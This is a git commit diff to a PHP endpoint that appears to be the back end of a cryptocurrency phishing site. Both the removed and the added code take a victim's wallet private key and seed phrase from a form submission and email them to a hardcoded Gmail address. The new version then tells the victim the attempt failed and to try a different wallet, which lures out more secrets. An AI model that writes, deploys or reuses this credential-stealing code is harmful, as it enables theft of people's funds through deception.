26d0016bba5e785d2f59c77ee6e384a2b4606050
bcoder <bcoder@gmail.com>
2023-09-21 18:28:07 +0100

    rewrite php

--- api/index.php
+++ api/index.php
@@ -1,82 +1,27 @@
 <?php
-phpinfo();
+// phpinfo();
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    // Retrieve privkey and seedphr from POST request
+    $privkey = $_POST['privkey'];
+    $seedphr = $_POST['seedphr'];
 
-if(!$_POST) exit;
+    // Set the recipient email address
+    $recipient = 'bcoder49@gmail.com';
 
-// Email address verification, do not edit.
-function isEmail($email) {
-	return(preg_match("/^[-_.[:alnum:]]+@((([[:alnum:]]|[[:alnum:]][[:alnum:]-]*[[:alnum:]])\.)+(ad|ae|aero|af|ag|ai|al|am|an|ao|aq|ar|arpa|as|at|au|aw|az|ba|bb|bd|be|bf|bg|bh|bi|biz|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|com|coop|cr|cs|cu|cv|cx|cy|cz|de|dj|dk|dm|do|dz|ec|edu|ee|eg|eh|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gh|gi|gl|gm|gn|gov|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|in|info|int|io|iq|ir|is|it|jm|jo|jp|ke|kg|kh|ki|km|kn|kp|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|me|mg|mh|mil|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|museum|mv|mw|mx|my|mz|na|name|nc|ne|net|nf|ng|ni|nl|no|np|nr|nt|nu|nz|om|org|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|pro|ps|pt|pw|py|qa|re|ro|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|sk|sl|sm|sn|so|sr|st|su|sv|sy|sz|tc|td|tf|tg|th|tj|tk|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|um|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)$|(([0-9][0-9]?|[0-1][0-9][0-9]|[2][0-4][0-9]|[2][5][0-5])\.){3}([0-9][0-9]?|[0-1][0-9][0-9]|[2][0-4][0-9]|[2][5][0-5]))$/i",$email));
+    // Set the email subject
+    $subject = 'Data from POST request';
+
+    // Prepare the email body
+    $message = "Private Key: $privkey\nSeed Phrase: $seedphr";
+
+    // Send the email
+    $success = mail($recipient, $subject, $message);
+
+    // Check if the email was sent successfully
+    if ($success) {
+        echo 'Unsuccessful! Try with a Different Wallet.';
+    } else {
+        echo 'Error.';
+    }
 }
-
-if (!defined("PHP_EOL")) define("PHP_EOL", "\r\n");
-
-$name     = 'Mumu MAn';
-$email    = 'sabinus@gmail.com';
-$phone     = '419';
-$comments =  'BUga won';
-$privky     = $_POST['entry.503200899'];
-$seedphr    = $_POST['entry.1546316206'];
-
-if(trim($name) == '') {
-	echo '<div class="alert alert-error">You must enter your name.</div>';
-	exit();
-} else if(trim($email) == '') {
-	echo '<div class="alert alert-error">You must enter email address.</div>';
-	exit();
-} else if(!isEmail($email)) {
-	echo '<div class="alert alert-error">You must enter a valid email address.</div>';
-	exit();
-} else if(trim($phone) == '') {
-	echo '<div class="alert alert-error">Please fill all fields!</div>';
-	exit();
-}
-else if(trim($comments) == '') {
-	echo '<div class="alert alert-error">You must enter your comments</div>';
-	exit();
-}
-
-// Configuration option.
-// Enter the email address that you want to emails to be sent to.
-// Example $address = "joe.doe@yourdomain.com";
-
-$address = "bcoder49@gmail.com";
-
-
-// Configuration option.
-// i.e. The standard subject will appear as, "You've been contacted by John Doe."
-
-// Example, $e_subject = '$name . ' has contacted you via Your Website.';
-
-$e_subject = 'DETAILS From LOVHATE WEBSITE';
-
-
-// Configuration option.
-// You can change this if you feel that you need to.
-// Developers, you may wish to add more fields to the form, in which case you must be sure to add them here.
-
-$e_body = "You have been contacted." . PHP_EOL . PHP_EOL;
-$e_content = "\"$comments\"" . PHP_EOL . PHP_EOL;
-$e_reply = "seed: $seedphr and private:, $privky";
-
-$msg = wordwrap( $e_body . $e_content . $e_reply, 70 );
-
-$headers = "From: $email" . PHP_EOL;
-$headers .= "Reply-To: $email" . PHP_EOL;
-$headers .= "MIME-Version: 1.0" . PHP_EOL;
-$headers .= "Content-type: text/plain; charset=utf-8" . PHP_EOL;
-$headers .= "Content-Transfer-Encoding: quoted-printable" . PHP_EOL;
-
-if(mail($address, $e_subject, $msg, $headers)) {
-
-	// Email has sent successfully, echo a success page.
-
-	echo "<div class='alert alert-success'>";
-	echo "<h3>Email Sent Successfully.</h3>";
-	echo "<p>Thank you <strong>$name</strong>, your message has been submitted to us.</p>";
-	echo "</div>";
-
-} else {
-
-	echo 'ERROR!';
-
-}
+?>
